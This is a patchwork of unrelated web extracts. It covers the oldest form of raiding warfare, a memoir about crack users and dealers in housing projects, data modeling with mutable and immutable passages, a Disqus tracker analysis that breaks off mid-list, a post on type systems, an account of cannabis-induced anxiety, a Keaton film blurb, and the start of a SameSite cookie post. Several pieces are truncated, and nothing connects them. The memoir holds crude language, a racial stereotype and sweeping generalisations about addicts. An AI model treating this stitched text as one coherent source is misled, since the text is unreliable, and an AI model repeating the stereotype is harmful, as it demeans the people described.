<p>Except that for most of the human experience, this sort of battle was rare and generally indecisive when it did happen (a point which leads to the marvelous title of the upcoming, <em><a href="https://www.amazon.com/Other-Face-Battle-Forgotten-Experience/dp/0190920645">The Other Face of Battle</a></em>).  This ‘Face of Battle’ kind of war – formally constituted field armies meeting in set-piece battles out on open fields, with a clearly defined ‘peace’ before and after the war, along with a zone of conflict and a ‘home front’ – is the kind of war modern folks tend to be quickest to imagine, because in most of the industrialized world, we imagine this as <em>our</em> way of war.  But it not the oldest, or most common, or original way of war.</p>



<p>The oldest way of war was what Native North Americans called – evocatively – the ‘cutting off’ way of war (a phrase I am borrowing from W. Lee, “The Military Revolution of Native North America” in <em>Empires and Indigines</em>, ed. W. Lee (2011)), but which was common among non-state peoples <em>everywhere</em> in the world for the vast stretch of human history (and one may easily argue much of modern insurgency and terrorism is merely this same toolkit, updated with modern weapons).  <a href="https://youtu.be/4I8kic8xZh8">The goal of such warfare was not to subjugate a population but to drive them off, forcing them to vacate resource-rich land which could then be exploited by your group</a>.  To do this, you wanted to inflict maximum damage (casualties inflicted, animals rustled, goods stolen, people captured) at minimum risk, until the lopsided balance of pain you inflicted forced the enemy to simply move away from you to get out of your operational range.</p>



<p>The main tool of this form of warfare (detailed more extensively in A. Gat, <em>War in Human Civilization</em> (2006) and L. Keeley, <em>War Before Civilization</em> (1996)) was the raid.  Rather than announcing your movements, a war party would attempt to advance into enemy territory in secret, hoping (in the best case) to catch an enemy village or camp unawares (typically by night) so that the population could be killed or captured (<em>mostly</em> killed; these are mostly non-specialized societies with limited ability to incorporate large numbers of subjugated captives) safely.  Then you <em>quickly</em> get out of enemy territory before villages or camps allied to your target can retaliate.  If you detected an incoming raid, you might rally up <em>your</em> allied villages or camps and ambush the ambusher in an equally lopsided engagement.</p>



<p>Only rarely in this did a <em>battle</em> result – typically when both the surprise of the raid and the surprise of the counter-raid ambush failed.  At that point, with the chance for surprise utterly lost, both sides might line up and exchange missile fire (arrows, javelins) at fairly long range.  Casualties in these battles were generally very low – instead the battle served both as a display of valor and a signal of resolve by both sides to continue the conflict.  That isn’t to say these wars were bloodless – indeed the overall level of military mortality was much <em>higher</em> than in ‘pitched battle’ cultures, but the killing was done almost entirely in the ambush and the raid.</p>



<p><strong>We may call this the first system of war.</strong>  It is the oldest, but as noted above, never entirely goes away.  We tend to call this style ‘asymmetric’ or ‘unconventional’ war, but it is the <em>most</em> conventional war – it was the first convention, after all.  It is also sometimes denigrated as primitive, but should not be judged so quickly – first system armies have managed to frustrate far stronger opponents when terrain and politics were favorable.</p>

<p>What changed?  Very briefly, agriculture, cities and the state.  Agriculture created a stationary population that both wouldn’t move but which could also be dominated, subjugated and have their production extracted from them.  Their wealth was clustered in towns which could be fortified with walls that would resist any quick raid, but control of that fortified town center (and its administrative apparatus of taxation) meant control of the countryside and its resources.  Taking such a town meant a siege – delivering a large body of troops and keeping them there long enough to either breach the walls or starve out the town into surrender.  This created a war where …</p></div></div>

        <p>For those of you who don’t recognize him, the photo above is me and Richard Donnell Ross, also known as <a href="https://en.wikipedia.org/wiki/%22Freeway%22_Rick_Ross" target="_blank">“Freeway Rick” Ross</a>: the most infamous crack dealer of all time (not the fat ass rapper who stole his name). The original “Johnny Appleseed of Crack”. The most successful crack dealer in history. I figured that the photo was appropriate.</p>

<p>For those of you who don’t know, <a href="https://edlatimore.com/the-projects/">I grew up in the projects.</a></p>

<p>In the ghetto, there are crackheads. In case you didn’t know, crackheads are people addicted to crack-cocaine. Crackheads and the ghetto go together like Kool-Aid and fried chicken.</p>

<p>Crackheads get their crack from somewhere. That’s where crack dealers come in. I grew up in the projects. This means I spent a lot of time around crack dealers and crack addicts. However, my experience had a unique feature.</p>

<p>I spent about 5 years living next to a certified crackhead. When I moved to another housing project, I lived next to a crack dealer for 4 years.</p>

<p>The hood is a terrible place to begin with. I can assure you that living next to hard drug users and dealers is a unique level of hell.</p>

<p>These are my observations, lessons learned, and experiences from living next to crack dealers and crackheads.</p>



<h2 id="crackheads-are-surprisingly-functional">Crackheads are surprisingly functional</h2>

<p>A lot of crackheads rob and steal to get drug money. There are also quite a bit who have jobs.</p>

<p>They use that money to fund their crack habit and to also keep a roof over their head. Not all crackheads want to get high in a crack house.</p>

<figure>
<p><img src="https://edlatimore.com/images/Webp.net-resizeimage%20(44).jpg" alt="Crackheads live in a crackhouse like this" title="Crackheads live in a crackhouse like this"></p>
  <figcaption>A typical crackhouse. Yes, they actually ‘live’ here.</figcaption>
</figure>

<p>My mom even occasionally let a crackhead babysit us. She lived next door to me as a kid. This brings me to my next experience.</p>

<h2 id="crackheads-value-drugs-over-money">Crackheads value drugs over money</h2>

<p>The crackhead next door babysat me.</p>

<p>When I was 4 years old, I picked up a syringe full of heroin and squirted it. I thought it was a water gun. The crackhead was super angry. I remember my mom offering to pay for the lost drugs, but the junkie didn’t calm down.</p>

<p>I actually don’t remember the eventual resolution.</p>

<p>In the world of a crackhead, crack is God.</p>

<p>Crackheads sell their children to get crack money. Male and female crackheads will suck dick so they can get crack when low on funds.</p>

<p>No crime is too great or too low once a person has sold their soul to the crack devil.</p>

<p><strong><em>(Read: “<a href="https://edlatimore.com/how-to-hustle-like-a-crackhead/">How To Hustle Like A Crackhead</a>”)</em></strong></p>

<h2 id="because-of-the-last-point-the-crackhead-economy-is-legendary">Because of the last point, the crackhead economy is legendary</h2>

<p>It’s common to hear someone in the hood talk about “crack prices” when referring to something inappropriately priced.</p>

<p>An object is in the “crack price” range when it’s priced low to expedite the sale.</p>

<p>My introduction to the concept of crack prices came at age 5.</p>

<p>One day my dad parked his car outside and went through the extra effort of putting his Club anti-theft device on. I asked him why he put The Club on. His response was, “So some crackhead doesn’t steal my car and sell it for 5 dollars.”</p>

<p>That confused me.</p>

<p>While 5-year old me didn’t know how much cars cost, I knew they were a lot more than 5 dollars. Once I learned that the rock is the most important thing to a crackhead, it all made sense.</p>

<p>Since then, I’ve watched or been victim to this type of crackhead behavior on a few occasions.</p>

<p>I’ve known crackheads to break out car windows for loose change in the seats, ignoring anything else of value.</p>

<p>Once a crackhead broke into my apartment and only stole a jar of change and a cable box. The crackhead is extremely short-sighted.</p>

<p>It’s only thinking about the fastest way to get just enough money to get high again.</p>

<p><strong><em>(Read: “<a href="https://edlatimore.com/a-basic-bro-beginners-guide-to-making-money-online/">The Basic Bro Beginner’s Guide To Making Money Online</a>”)</em></strong></p>

<h2 id="superhuman-feats-ascribed-to-crackheads-are-inspired-by-true-events">Superhuman feats ascribed to crackheads are inspired by true events</h2>

<p>Crack doesn’t ACTUALLY give a person superpowers.</p>

<p>I joke about the crackhead superpowers, but all good jokes contain truth. What probably happens is crack changes their brain, allowing them to <a href="https://edlatimore.com/pushing-through-the-pain/">endure high amounts of pain.</a></p>

<p>I’ve seen crackheads get hit by cars and keep moving. I once watched a crackhead fall a few stories and shake it off like nothing happened. I’ve personally seen crackheads jump out of burning buildings and land in stride.</p>

  <figcaption>Crackhead strength display</figcaption>
</figure>

<p>You also don’t really meet any fat crackheads. Maybe crack raises your metabolism, but it is likely just a symptom of the previous observation. Crack is more important to crackheads than food.</p>

<p>If you only have 5 dollars from the car you stole and sold, crack comes before food. Even if you haven’t eaten in days.</p>

<h2 id="the-biggest-problem-with-illegal-drugs-is-the-violence-between-suppliers-not-between-buyers">The biggest problem with illegal drugs is the violence between suppliers, not between buyers</h2>

<p>They make a big deal about drug violence and why we need all these laws against drugs. My perspective is unique.</p>

<p>I have no skin in the game either way but grew up at ground zero of war on drugs. Here’s what I’ve observed.</p>

<p>I’ve never actually seen two crackheads fighting one another.</p>

<p>I’ve seen them fighting other non-crackheads, but they don’t really go to war with one another. However, the crack dealer next door is one of the reasons there were bullet holes in my door.</p>

<p>On a more general note, most hood violence is drug-related.</p>

<p>It’s about controlling who sells what, where, and for how much. Random muggings aren’t as common as shooting disputes over street corners.</p>

<h2 id="bad-traits-come-in-clusters-especially-with-crack-dealers">Bad traits come in clusters. Especially with crack dealers</h2>

<p>I’ve met a few dealers of all different substances. My general experience has been that the harder the drug, the worse the human being is that deals it.</p>

<p>I’m sure this is a result of the level of ruthlessness you need to get into and survive the game. Harder drugs are worth more money so the competition is tougher.</p>

<p>This is merely speculation, but it makes sense.</p>

<p>The crack dealer who lived next door to me regularly beat his girlfriend. Once, he tried to push his way into my house to go after my then 10-year-old sister to beat her.</p>

<p>She played a harmless prank, but he didn’t care. I pushed him out of my house, but for weeks I worried that he’d shoot my 13-year-old ass.</p>

<h2 id="dont-start-no-shit-there-wont-be-no-shit-with-crack-dealers">Don’t start no shit there won’t be no shit with crack dealers</h2>

<p>Drug dealing is a thing a person gets into to make money.</p>

<p>The ROI is shitty, but most guys sell drugs as a way to make ends meet. They aren’t in it to fuck the world up or hurt others (despite what drugs do to people).</p>

<p>They just want to put food on the table.</p>

<p>You generally don’t have to worry about drug dealers trying to hurt or you rob you for no good reason.</p>

<p>Unless you’re a player in the game, you’re safe. These guys have other issues but if you keep to yourself, you don’t have to worry about crack dealers.</p>

<h2 id="misery-loves-company">Misery loves company</h2>

<p>You’ll never meet someone more generous than a hard drug user offering a hit of his drugs.</p>

<p>I never used any hard drugs. I was offered heroin, crack, and coke on a few occasions. The dealers weren’t the ones making the offer. It was always a user while they were getting high.</p>

<p>I don’t think something about being a smack or crackhead makes you more altruistic than the general population. I think this is an attempt to normalize their behavior.</p>

<p>If you accept their invitation, it makes them feel a lot better about feeding their addiction in your company.</p>

<h2 id="more-people-are-on-hard-drugs-than-you-think">More people are on hard drugs than you think</h2>

<p>I didn’t learn this directly from living in the projects.</p>

<p>I knew a guy who made home deliveries. One day (in the rash stupidity of youth), I did a ride along with him. I couldn’t come into the house and meet the clients although we were in some pretty nice areas.</p>

<p>Most clients bought “soft” (cocaine). A few wanted “hard” (crack). He told me that most of these people were doctors and lawyers.</p>

<p>This reiterates what I’ve stated earlier about drug dealers being functional individuals. These people can hold down a job (even a damn good one) but they just like to party.</p>

<p>Living next to crackheads and crack dealers is something I will never do again. However, I can’t deny that I’ve learned some things about life that you can’t pay to learn.</p>

    <h2>Get Your Life Together With The Essays of Power</h2>
    <p>I don’t know you, but I know you.</p>

<p>I know that you’re tired of feeling weak, being a victim, and having no control over the direction of your life.</p>

<p>I know you because I was once you.</p>

<p>I used to be stuck on the hedonistic treadmill of mediocrity. Always drunk, always broke, and always looking for the next piece of cheap entertainment and distraction.</p>

<p>Then one day, I changed my entire life around.</p>

<p>I took responsibility for my personal development and started living the best life I possibly could. I learned how to:</p>

<ul>
  <li>Live with purpose</li>
  <li>Think with clarity</li>
  <li>Face the my demons</li>
  <li>Fix my finances</li>
</ul>

<p>Unlike a lot of other motivational gurus, I’ve been to the bottom and I clawed my way back out. It wasn’t easy and I wasn’t sure if I’d just become another statistic along the way, but I think I have made tremendous progress.</p>

<p>I learned the hard way, but I can break it down so you can learn it the easy way…</p>

<p>One of my coaching clients was designing a program, and came to me with a data-modeling question. The program was for making interactive stories like those Choose Your Own Adventure books. A story contained many passages. In a passage, you might encounter a monster, and then flip to page 62 to fight it, or to page 187 to run away.</p>

<p>He had been choosing between two models. In one, the story contains a list of passages. In the other, each passage has a reference to a story. Which was better?</p>

<p>They have differences in which operations they make easier or more complicated. But I told him that, before even discussing this, or looking at third alternatives: there’s a basic question to answer first:</p>

<p>Do they even represent the same thing?</p>

<p><i>  To think about this question, stay here.

<p>I smiled as I gave my answer: <i>They are equivalent if passages are immutable, but different if they are mutable.</i></p>

<h2>
Identity</h2>

<p>At first glance, both options seem identical. Option 1 says that a story has many passages. Option 2 says that every passage is associated with a story. It’s a one-to-many-relationship.</p>

<p>Or is it? It’s pretty obvious in Option 2 that no passage can be associated with two stories. But they can be in Option 1 —in the mutable case only.</p>

<p>Why not in the immutable case? You might think that you can create an immutable passage, stick it in two stories, and presto — sharing! But, in the immutable world, one copy used twice is the same as two independent copies.</p>

<p>Think about what happens when you go to implement the “edit passage” screen. In the mutable world, you modify the title and content in-place, and it gets updated in both stories. But in the immutable world, modifying the passage really means making a modified copy, and updating it into the story. It’s copy-on-write. To modify the other story similarly, you’d have to go find it and do the same operation to its passage. It really is a separate copy.</p>

<p>What we’ve seen is a fundamental concept in programming: <i>mutable values have identity</i>. And immutables don’t.</p>

<p>With immutable values, there is no notion of “the same” story or passage beyond “these two have the same values.” There is no way to distinguish between two stories that have the same passage, vs. two stories that have identical copies of the passage. There is no true sharing.</p>

<p>With mutability, the opposite holds. If there are two passages that have the same values, and updating one also updates the other (i.e.: all reads and writes are identical), then they really are the same. Conversely, it’s now possible to have two identical passages which are not the same.</p>

<p>So, the mutable vs. immutable debate is not just about in-place updates vs. modified copies. Immutability means independent parts. Mutability means sharing.</p>

<p>One way to model this is to think of every mutable value as really a pair. The first element of this pair is the value itself. The second element is a magic “token,” created at allocation-time, which is guaranteed to be distinct from every other such token in the program. This explains why, if you do want proper sharing in the immutable world, you’ll need to change your data model to explicitly add some kind of identifier. This, by the way, is one of the reasons why it’s correct to think about immutability as the default, and mutability as an added feature.</p>

<p>
<b>
Bigger Differences</b></p>

<p>In the example above, there’s a simple fix if you like Option 1, but you don’t want sharing between stories: Add an extra rule, or invariant, forbidding sharing. Every rule means extra work to enforce, but this one should be easy. And you still have the option to just not care about sharing.</p>

<p>But adding mutability can mean more pervasive changes to a data model. Here are two more options for passages and stories, in stripped-down form. In Option 3, the story has a start passage, and every passage has a number of successors. In Option 4, we store the edges in reverse, with each passage having a parent.</p>

<div dir="ltr">
<table><colgroup><col width="*"><col width="*"></colgroup><tbody>
<tr><td><p><span>Option 3:</span></p>
</td><td><p><span>Option 4:</span></p>
</td></tr>
<tr><td><p><span>Story:</span></p>
<p><span> &nbsp;start: Passage</span></p>

<p><span>Passage:</span></p>
<p><span> &nbsp;links: Passage[]</span></p>
<p><span> &nbsp;&lt;content&gt;</span></p>
</td><td><p><span>Story:</span></p>
<p><span> &nbsp;passages: Passage[]</span></p>
<p><span> &nbsp;startIdx: int</span></p>

<p><span>Passage:</span></p>
<p><span> &nbsp;parent: optional&lt;Passage&gt;</span></p>
<p><span> &nbsp;&lt;content&gt;</span></p>

<p><span>Extra invariant:</span></p>
<p><span> &nbsp;&nbsp;Every passage is reachable from the start passage</span></p>
</td></tr>
</tbody></table>
</div>

<p>If you squint at it right, when passages are immutable, these are the same. Option 3, naturally, represents trees (no cycles). But, by reversing the arrows, any tree can also be turned into the form of Option 4, so Option 4 also represents trees. This is a convenient lie up until you have to implement any kind of editing, and find that it’s just pretending to be a tree: you’ll need to rebuild large sections on every edit.</p>

<div dir="ltr">
<table><colgroup><col width="*"><col width="*"></colgroup><tbody>
<tr><td><p><span>Option 3, immutable</span></p>
</td><td><p><span>Option 4, immutable</span></p>
</td></tr>
<tr><td><p><span><img height="232" src="https://lh6.googleusercontent.com/m78lJHFkBmOoysWX-rDggwcQz97kTGT-9dpswe9fSlyy6aENagl_4-UjtHSHeAnrbBghRSSRM_8qL_BKGGdtIGkIswWAeVMj7ApOVEQDKK35Y8qjuaHQBEtSjoV1cauf5LYod1XG" width="298"></span></p>

</td></tr>
</tbody></table>
</div>
<p>But, after adding mutability, Options 3 and 4 become unequivocally not the same. When passages have identity, Option 3 now represents arbitrary graphs with ease. Option 4, meanwhile, now represents these weird graphs that can have cycles, but where every passage can only have one predecessor. Picking between models goes from a game of “which one is more convenient to use” to “which one actually represents a story?”</p>

<div dir="ltr">
<table><colgroup><col width="*"><col width="*"></colgroup><tbody>
<tr><td><p><span>Option 3, mutable</span></p>
</td><td><p><span>Option 4, mutable</span></p>

<tr><td><p><span><img height="306" src="https://lh4.googleusercontent.com/BzJN3_ObyC4WI58WJ09LtlaJD4OIuo-kEPH70YVoUTGaWerygaUj_PtF8VufU-rpqvDomBJAaYaqy3kkCmW7HnE6Shb2juM5kg77nK0MSbjgXsoXhTAlUCWQ4rlObcMiFmaOE_ui" width="252"></span></p>

</tbody></table>
</div>

<p><b>Reversing the Polarity</b></p>

<p>We’ve seen two examples where adding mutability suddenly made two data models different. Is there a case where the story is reversed, and mutability can make two different models the same?</p>

<p>At first I thought there wasn’t — making things mutable just adds distinctions. We need the reverse. But for any rule about data structures, you can often get a reverse rule by putting the data structure in a “negative position” —  that is, as the argument to a function, or as the key to a map. So consider options 5 and 6, this time representing just passages:<b></b></p><div dir="ltr">
<table><colgroup><col width="*"><col width="*"></colgroup><tbody>
<tr><td><p><span>Option 5:</span></p>
</td><td><p><span>Option 6:</span></p>
</td></tr>
<tr><td><p><span>Passage:</span></p>
<p><span> &nbsp;title: string</span></p>
<p><span> &nbsp;content: string</span></p>
<p><span> &nbsp;summary: string</span></p>
</td><td><p><span>Passage:</span></p>
<p><span> &nbsp;title: string</span></p>
<p><span> &nbsp;content: string</span></p>

<p><span>Global:</span></p>
<p><span> &nbsp;summary: Map&lt;Passage, string&gt;</span></p>
</td></tr>
</tbody></table>
</div>
<p>Here, we want to track some extra information on a passage. Perhaps you want to add some auxiliary information like the Chinese translation or a summary. Or perhaps you want to compute some property of all the passages, like how many steps till the end of the story, and you need to cache the intermediate results. The most straightforward way is adding an extra field. But another approach is to create a hashmap elsewhere associated each passage to some extra data. This pattern is often necessary when extending third-party APIs. And it only works when the objects are mutable.</p>

<p>Option 5 is always straightforward: each passage gets an extra string. But with immutable passages, Option 6 has an extra restriction: there cannot be two passages with the same title and content, but a different summary. Database people call this a functional dependency.</p>

<p>Perhaps you can hack it by making the map check for pointer-equality anyway, but chances are you’re breaking the assumptions of the rest of your code. Immutable code usually moves and copies objects willy-nilly, meaning that “the same object” will have different memory addresses over time.</p>

<p>On the other hand, when passages are mutable, you can think of every passage as coming with a magic token that distinguishes it from others with the same values. And so, that hashmap really does just mean that every passage gets some extra data.<a href="#1" name="top1"><sup>1</sup></a></p>

<p><span>The True Relationship</span></p>

<p>In software design, the first step is to<a href="http://www.pathsensitive.com/2018/02/making-bugs-impossible-illustrating.html"> discover the essence of the concepts you are implementing</a>. I wrote in the first paragraph that a story contains many passages, so the basic idea is that a story contains passages, right?</p>

<p>Too fast. Since it makes sense to speak of a passage without a story, neither direction is more primitive. The primitive idea is just that the one-to-many relationship exists. If you were modeling stories in a database, the standard approach is to have a table just for storing the stories-passages relationship, separate from the tables for stories and passages. You can get the passages for a story, and the story for a passage. The relationship knows no direction.</p>

<p>How do you express this in a program? In 1987, a researcher at General Electric <a href="https://www.semanticscholar.org/paper/Relations-as-Semantic-Constructs-in-an-Language-Rumbaugh/ca82d99f69ad34371288e06ab1d6cf264d4319e9">came up with an idea</a> for a new style of programming in which relationships between objects can be created and manipulated as easily as the objects themselves. There’s been an uptick in the past decade, but first-class relationships still haven’t caught on even in the research world, and so I promise your language doesn’t have them. We can’t put the idea of a story-passage relationship directly into the program. We have to make do.</p>

<p><span><img height="380" src="https://lh6.googleusercontent.com/esxNkC39bU3TSuC0UGkY8377Fv-ZrXDWz1xo7ex2z_gDzZZwZqgVlKZY7I51fCDE-raCYLl1FacErF6T1X9IF3vEwA9-_9grzyjHxXw9kio-wfT1sP54YB6-qDh53P38G92CO15T" width="624"></span></p>


<p>In databases, when you find yourself often using something in one table to look up things in another, you can speed things up by <i>denormalizing</i> the structure, fusing two tables together. In one possible denormalization, you fuse the Story-Passages table into the Stories table, giving each story a list of passages. In another denormalization, you fuse the Story-Passages table into Passages, giving each Passage a reference to its containing story. The two denormalizations correspond to the original Options 1 and 2 at the top of this post. (A third denormalization fuses Story-Passages into both.)</p>

<p>And now, we see that the reasons to choose one over the other are the same as the reasons to denormalize a table. For the choice between the <span>passages</span> and the <span>story</span> fields, it’s a matter of how often each would be accessed. Since data tends to be accessed hierarchically, I’d expect the need to fetch all the passages of a story to be great, and the need to work with a passage of an unknown story to be slight. This suggests Option 1 (well, Option 1 + more fields you need to actually write this app). But know that both are denormalizations of the true relationship.</p>

<p>Disqus is a free commenting system and a great example of "if you're not paying for it, you become the product". Unfortunately, in Disqus' case, your website visitors become the product too.</p><p>Today, I'm going to analyze what happens when you embed Disqus on your website.</p><p>I signed up at <a href="https://disqus.com/">Disqus</a> and added the installation code to a <strong>blank page</strong> (So, I'm sure every HTTP request that the browser makes is from Disqus).</p><p>Disqus makes 76 HTTP requests and fetches 2MB of data! (even with 0 comments). And, it took 7 seconds to load.</p><p><img src="https://i.imgur.com/tCZxbmi.png" alt="Disqus HTTP Requests"></p><p>Disqus <a href="https://techcrunch.com/2017/12/05/zeta-global-acquires-commenting-service-disqus/">was acquired</a> by an advertising company called Zeta Global in 2017. Obviously, advertising companies do everything to increase their revenue (Ex: the Big G).</p><p>I analyzed the network requests log. Disqus makes HTTP requests to 11 different third-party domains through the browser. <strong>All of these websites are trackers/pixels</strong> (Even some were detected as malware by my security guard).</p><p>Here are the external domains:</p><ul><li><a href="https://viglink.com/">viglink.com</a>* - One of Disqus's major partners.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
				<p>After doing a little searching, I’ve found it’s a little difficult to understand the differences between strongly typed, weakly typed, dynamically typed, and statically typed programming languages. I’d like to clear that up.</p>

<p>First, let’s define what typing is:</p>

<blockquote>
<p>In programming languages, a type system is a <strong>collection of rules</strong> that assign a property called a type to the various constructs—such as variables, expressions, functions or modules—a computer program is composed of. The main purpose of a type system is to reduce bugs in computer programs by defining interfaces between different parts of a computer program, and then checking that the parts have been connected in a consistent way. <strong>This checking can happen statically (at compile time), dynamically (at run time), or it can happen as a combination of static and dynamic checking.</strong> <a href="http://en.wikipedia.org/wiki/Type_system">Wikipedia</a></p>
</blockquote>

<p>There are two important pieces to pull from the definition. The first is that a type system is a collection of rules. The second is that checking for the rules can apply at different times.</p>

<p>Here’s what we can deduce so far:</p>

<ul>
<li>Strongly typed - many rules</li>
<li>Weakly typed - few rules</li>
<li>Dynamically typed - rules applied at run time</li>
<li>Statically typed - rules applied at compile time</li>
</ul>

<p>There is an extremely helpful post by <a href="http://blogs.agilefaqs.com/2011/07/11/dynamic-typing-is-not-weak-typing/">Naresh Jain</a> that includes this diagram:</p>

<p><a href="http://josephspurrier.com/wp-content/uploads/2014/02/strongweakstaticdynamic_type.png"><img src="http://www.josephspurrier.com/wp-content/uploads/2014/02/strongweakstaticdynamic_type.png" alt="strongweakstaticdynamic_type"></a></p>

<p>Naresh’s image shows that there are different degrees of typing. There are languages that have more rules (more strongly typed) than others.</p>

<p>Here’s another definition from Wikipedia that explains a strongly typed language:</p>

<blockquote>
<p>In 1974, Liskov and Zilles described a strong-typed language as one in which “whenever an object is passed from a calling function to a called function, its type must be compatible with the type declared in the called function.” Jackson wrote, “In a strongly typed language each data area will have a <strong>distinct type</strong> and each process will state its communication requirements in terms of these types.” <a href="http://en.wikipedia.org/wiki/Strong_and_weak_typing">Wikipedia</a></p>
</blockquote>

<p>According to this definition, PHP is NOT a strongly typed language because you can pass multiple variable types to the same function. Let’s take a look at this example of PHP:</p>

<pre><code>// Pass the integer 4
// Outputs: int(9)
var_dump(foo(4));

// Pass the string 4
// Outputs: int(9)
var_dump(foo('4'));

// Pass the string 4
// Outputs: Fatal error: Unsupported operand types
var_dump(foo(array(4)));

// Argument does not have a distinct type
function foo($bar)
{
    // Return the value + 5
    return $bar + 5;
}
</code></pre>

<p>In the example above, the function, foo(), does not specify a distinct type for argument $bar so a programmer can pass any type of variable. The first time the function is called, the integer of 4 is passed and returns an integer of 9. The second time the function is called, the string of 4 is passed and again returns an integer of 9. The third and final time the function is called, an array containing an integer of 4 is passed and results in a Fatal Error.</p>

<p>The example above shows PHP is weakly typed and dynamically typed. In terms of the number of rules, PHP uses strings and integers interchangeably so there are “less rules”. Therefore, PHP is considered a weakly typed language. PHP is also dynamically typed because the rules are applied at run time instead of at compile time since PHP is not compiled and instead interpreted at run time.</p>

<p><strong>Note:</strong> PHP does support type hinting which makes it less weakly typed/more strongly typed, yet it is still considered a weakly typed language because you cannot use type hinting for integers or strings.</p>

<p>In summary, here are how I see the different types defined:</p>

<ul>
<li><strong>Strongly typed</strong> - types cannot be used interchangeably</li>
<li><strong>Weakly typed</strong> - types can be used interchangeably</li>
<li><strong>Dynamically typed</strong> - types are checked at run time</li>
<li><strong>Statically typed</strong> - types are checked at compile time</li>
</ul>

<p>Hopefully, this clears up a few things.</p>

  <h5>February 4, 2021</h5>



  
  
  

  


  <p>I recently got stoned for the first time in several years with Caleen. Whoa buddy. Like no time had passed at all. Instantly back where I was when I was a 24/7 stoner (about from 2007 to 2015).</p>
<p>I thought I might try to write about what it’s like for me. I think everyone’s experience is distinct, like a fingerprint of your soul. Caleen and I talked about it a little bit. She just always gets giggly. Not me. Sometimes, but unfortunately not usually.</p>
<p>Almost the first thing that hits me is the overwhelming sense of <em>being</em>. Like… simply the fact of existence and sensory input is too much to bear. In normal day life this is not a problem, of course how else could I function? My god, thinking back.. how <em>did</em> I function stoned all the time? The answer is there in my memory and it is this: <em>with great difficulty</em>. I never gave up trying. Out of maybe thousands of deeply conflicted confrontations with the nature of my existence in this reality, I never let go and never gave up on the fact that whether I like it or not <em>it is</em>.</p>
<p>I’m not sure the adjective “horrifying” is something that will make sense without some expansion. And I guess that’s kind of central to my experience. If I can explain why it is horrifying, then maybe I can understand it better.</p>
<p>Let’s start with focusing on a single sensory input. Vision, let’s say. That’s usually the first thing I become hyper aware of- and I think it makes sense, being sort of the most primary of human senses.</p>
<p>When I got high the other night, almost immediately I became hyper aware of my sense of vision. Being aware isn’t itself scary, of course. Being a naturally inquisitive person, and especially under the influence, I start to ask questions. Almost every single time. Why do I have vision? What am I seeing here? It’s in moments like this where questions like this aren’t satisfied by answers like “Well, photons are massless particles (bosons, actually) that travel at the maximum speed limit of the universe whose wave combination behavior can be described by the Heisenberg uncertainty principle. And because our eyes are photosensitive, the energy conveyed by a photon interacting with our eyes results in the experience of color”.</p>
<p>No, I hyperfocus on what <em>experience</em> is. And it gets me into trouble. If I can describe it in computer science terms it might be something like a recursion stack overflow. It’s deeply unsettling, whatever it is.</p>
<p>Even sober, sometimes I get into this mood I think most philosophers and scientists in the history of the world must get at some point. It’s fascinating to be able to describe a feature of reality with such detail.</p>
<p>But it doesn’t really get at the heart of, like, <em>why though</em>?</p>
<p>Most experimental physicists I’ve ever read say something along the lines of  “Yeah, it’s crazy. But all we can do is report what we find even if it seems insane.” So, my stoned mind <em>really</em> wants to think more about this, presumably under the impression that the effects of a plant no less a child of the universe than it can help connect it better to its true nature. Sober minds far more educated than mine can’t make sense of it. Maybe altering the perception of reality can help. And honestly, sometimes it feels like you finally have it figured it out only your brain is so distorted you have no human way of communicating it even to your later sober self. But that’s not when things are scary, that’s more of a “Well that’s too bad, but also remember the time you left a very important post it note to yourself that said ‘they observe you when you observe them’? Yeah, man. Great stoner thought.”</p>
<p>There’s a lot of paths a mind in an altered state can wander when asking questions like this. One of them is to doubt the fabric of reality altogether. That’s maybe the scariest one, because when you start to think that maybe your experience is really just a virtual reality helmet inside an inception style simulation inside the <em>real</em> reality… and critically <em>you begin to actually believe this</em> well… scary ideas can become scary reality quickly.</p>
<p>One of the ways I’ve managed this in the past, and it came in handy the other night is to force myself to acknowledge the inputs of my senses <em>and only the inputs of my senses</em> as reality. My thoughts are complicated machinations informed by and developed around decades of a mixture of pleasure and abuse, and therefore the primary thing <em>not</em> to trust.</p>
<p>If what I see <em>right now</em> is a woman offering nice words and calming behavior, I choose to trust that. My inner turmoil about how well I <em>actually</em> know this woman I have been close friends for a decade is garbage. That is a symptom of an unwell mind, possibly (obviously) one under the influence of an intoxicant. What is real <em>right now</em> is Caleen being a good friend. What my mind is doing is playing tricks with my senses. Given that it’s kind of hard to exist outside of one’s own mind, when it start playing tricks it can be really hard to realize it.</p>
<p>Now, this might seem obvious. And it is, from a place of sobriety. But in the moment when your mind is doing these things (you sort of asked it to do) your mind is telling you every single thing your senses are telling you are potential lies. The only way to win is maintain a part of your mind that questions everything, even itself. That concept only raises more questions. “How can a piece of a mind exist outside itself?” If minds are in anyway similar to a computer, well it’s not unlike asking a computer to report its current CPU usage. Which processes are dominating. Silicon can do, why shouldn’t neurons?</p>
<p>But nothing I’ve described answers what I call the question of experience, also known as the hard question of consciousness. And maybe nothing ever will. It is, after all, at the heart of what millenia of philosophy, religion, and science have been asking.</p>
<p>I’ve tried to paint a relatable picture of what it’s like for me. In actuality, it can be vastly more intense than doubting a friendship, or even reality. Imagine the kinds of things that you could let your mind replace reality if you let it. That’s what makes it truly horrifying, when every aspect of reality comes into question. From your fridge to your fingers to your friends.</p>
<p>Now, I’d love to dig into why my experience is not consistently giggily like Caleen’s, but I’m afraid that touches on some personal stuff I’m not ready to get into right now. Suffice it to say, it’s a mix of my experiences in life and a deliberate combination of no fear and punishment gluttony.</p>
<p>I would normally never publish something like this, but I’m getting into a stage of life where I think I’m pretty clearly safe to do so. And that is refreshingly nice to be able to say.</p>

As "the railrodder", Keaton crosses Canada from east to west on a railway track speeder. True to Keaton's genre, the film is full of sight gags as our protagonist putt-putts his way to British Columbia. Not a word is spoken throughout, and Keaton is as spry and ingenious at fetching laughs as he was in the old days of the silent slapsticks.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <p>In this post,
I dissect a common misconception about the <code>SameSite</code> cookie attribute
and I explore its potential impact on Web security.</p>
<h2 id="tldr">TL;DR <a href="#tldr">¶</a></h2>
<ul>
<li>The <code>SameSite</code> cookie attribute is not well understood.</li>
<li>Conflating <em>site</em> and <em>origin</em> is a common but harmful mistake.</li>
<li>The concept of <em>site</em> is more difficult to apprehend than meets the eye.</li>
<li>Some requests are cross-origin but same-site.</li>
<li><code>SameSite</code> is only concerned with cross-site requests.</li>
<li><code>SameSite</code> paints a target on your subdomains' back.</li>
<li>Misguided practitioners may unduly eschew <code>SameSite=Strict</code>.</li>
</ul>
